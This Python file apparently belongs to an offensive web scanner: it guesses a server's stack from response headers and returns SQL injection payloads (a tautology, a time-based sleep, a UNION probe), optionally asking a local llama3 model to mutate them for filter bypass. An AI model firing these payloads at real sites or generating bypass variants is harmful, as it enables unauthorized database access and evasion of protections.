import requests

class CerebroBrain:
    def __init__(self):
        self.ollama_url = "http://localhost:11434/api/generate"

    def analyze_tech(self, headers):
        h = str(headers).lower()
        if "php" in h: return ["PHP Server"]
        if "nginx" in h: return ["Nginx Proxy"]
        return ["Generic Stack"]

    def generate_payloads(self, mode, level):
        base = ["' OR 1=1 --", "1' AND SLEEP(5) --", "' UNION SELECT NULL--"]
        if level == "SINGULARITY":
            try:
                r = requests.post(self.ollama_url, json={
                    "model": "llama3", 
                    "prompt": f"Mutate SQLi for bypass: {base[0]}", 
                    "stream": False
                }, timeout=5)
                return [r.json().get('response', base[0]).strip()]
            except: return base
        return base